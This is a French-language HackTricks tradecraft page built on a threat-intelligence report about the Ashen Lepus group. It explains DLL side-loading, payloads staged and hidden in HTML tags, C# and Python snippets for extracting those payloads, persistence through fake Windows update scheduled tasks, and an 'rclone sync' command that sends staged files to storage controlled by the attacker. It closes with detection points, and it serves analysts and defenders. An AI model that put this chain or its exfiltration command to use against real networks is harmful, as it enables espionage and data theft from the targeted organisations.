# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) a exploité un schéma répétable qui enchaîne DLL sideloading, staged HTML payloads et backdoors .NET modulaires pour persister au sein des réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n'importe quel opérateur car elle s'appuie sur :

- **Archive-based social engineering** : des PDF bénins incitent les cibles à télécharger une archive RAR depuis un site de partage de fichiers. L'archive contient un EXE imitant un visualiseur de documents, une DLL malveillante nommée d'après une bibliothèque de confiance (p.ex., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), et un leurre `Document.pdf`.
- **DLL search order abuse** : la victime double-clique sur l'EXE, Windows résout l'import de la DLL depuis le répertoire courant, et le loader malveillant (AshenLoader) s'exécute dans le processus de confiance pendant que le PDF leurre s'ouvre pour éviter les soupçons.
- **Living-off-the-land staging** : chaque étape ultérieure (AshenStager → AshenOrchestrator → modules) est conservée hors disque jusqu'à son utilisation, livrée comme des blobs chiffrés cachés à l'intérieur de réponses HTML autrement inoffensives.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader** : l'EXE side-loads AshenLoader, qui effectue du host recon, le chiffre en AES-CTR, et l'envoie via POST dans des paramètres tournants tels que `token=`, `id=`, `q=` ou `auth=` vers des chemins ressemblant à des API (p.ex., `/api/v2/account`).
2. **HTML extraction** : le C2 ne révèle l'étape suivante que lorsque l'IP client se géolocalise dans la région ciblée et que le `User-Agent` correspond à l'implant, ce qui laisse perplexes les sandboxes. Quand les vérifications passent, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload** : AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère plus d'HTML, cette fois en découpant `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator** : un contrôleur .NET modulaire qui décode une config JSON en Base64. Les champs `tg` et `au` de la config sont concaténés/hachés pour former la clé AES, qui déchiffre `xrk`. Les octets résultants servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Module delivery** : chaque module est décrit via des commentaires HTML qui redirigent le parseur vers une balise arbitraire, contournant des règles statiques qui ne recherchent que `<headerp>` ou `<article>`. Les modules incluent persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) et file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l'opérateur n'a besoin que de changer la balise indiquée dans le commentaire HTML pour reprendre la livraison.

### Outil d'extraction rapide (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallèles d'évasion HTML Staging

Des recherches récentes sur HTML smuggling (Talos) mettent en évidence des payloads cachés sous forme de chaînes Base64 à l'intérieur de blocs `<script>` dans des pièces jointes HTML et décodés via JavaScript à l'exécution. La même astuce peut être réutilisée pour les réponses C2 : placer des blobs chiffrés à l'intérieur d'une balise script (ou un autre élément DOM) et les décoder en mémoire avant AES/XOR, faisant paraître la page comme un HTML ordinaire.

## Durcissement Crypto & C2

- **AES-CTR everywhere**: les loaders actuels intègrent des clés 256-bit ainsi que des nonces (par ex., `{9a 20 51 98 ...}`) et ajoutent optionnellement une couche XOR en utilisant des chaînes telles que `msasn1.dll` avant/après le déchiffrement.
- **Infrastructure split + subdomain camouflage**: les staging servers sont séparés par outil, hébergés sur différents ASNs, et parfois présentés par des sous-domaines à l'apparence légitime, de sorte que la compromission d'une stage n'expose pas le reste.
- **Recon smuggling**: les données énumérées incluent maintenant les listings de Program Files pour repérer les applis à haute valeur et sont toujours chiffrées avant de quitter l'hôte.
- **URI churn**: les paramètres de requête et chemins REST changent entre campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalident les détections fragiles.
- **Gated delivery**: les serveurs sont geo-fenced et ne répondent qu'aux implants réels. Les clients non approuvés reçoivent du HTML non suspect.

## Persistance & boucle d'exécution

AshenStager dépose des scheduled tasks qui se déguisent en tâches de maintenance Windows et s'exécutent via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles, garantissant qu'AshenOrchestrator peut demander des modules frais sans retoucher le disque.

## Utilisation de clients de sync bénins pour l'exfiltration

Les opérateurs stage des documents diplomatiques dans `C:\Users\Public` (world-readable et non suspect) via un module dédié, puis téléchargent le binaire légitime [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec le stockage contrôlé par l'attaquant. Unit42 note que c'est la première fois que cet acteur a été observé en train d'utiliser Rclone pour exfiltration, ce qui s'aligne sur la tendance plus large d'abuser d'outils de sync légitimes pour se fondre dans le trafic normal:

1. **Stage**: copier/collecter les fichiers cibles dans `C:\Users\Public\{campaign}\`.
2. **Configure**: envoyer un config Rclone pointant vers un endpoint HTTPS contrôlé par l'attaquant (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` de sorte que le trafic ressemble à des sauvegardes cloud normales.

Comme Rclone est largement utilisé pour des workflows de sauvegarde légitimes, les défenseurs doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes étranges, ou synchronisations soudaines de `C:\Users\Public`).

## Points de détection

- Alerter sur **signed processes** qui chargent de manière inattendue des DLLs depuis des chemins écrits par l'utilisateur (Procmon filters + `Get-ProcessMitigation -Module`), surtout quand les noms de DLL se chevauchent avec `netutils`, `srvcli`, `dwampi`, ou `wtsapi32`.
- Inspecter les réponses HTTPS suspectes pour **de gros blobs Base64 intégrés dans des balises inhabituelles** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Étendre la chasse HTML aux **chaînes Base64 à l'intérieur des blocs `<script>`** (HTML smuggling-style staging) qui sont décodées via JavaScript avant le traitement AES/XOR.
- Rechercher des **scheduled tasks** qui lancent `svchost.exe` avec des arguments non-service ou pointent vers des répertoires de dropper.
- Surveiller les binaires **Rclone** apparaissant hors des emplacements gérés par l'IT, les nouveaux fichiers `rclone.conf`, ou des jobs de sync tirant depuis des répertoires de staging comme `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
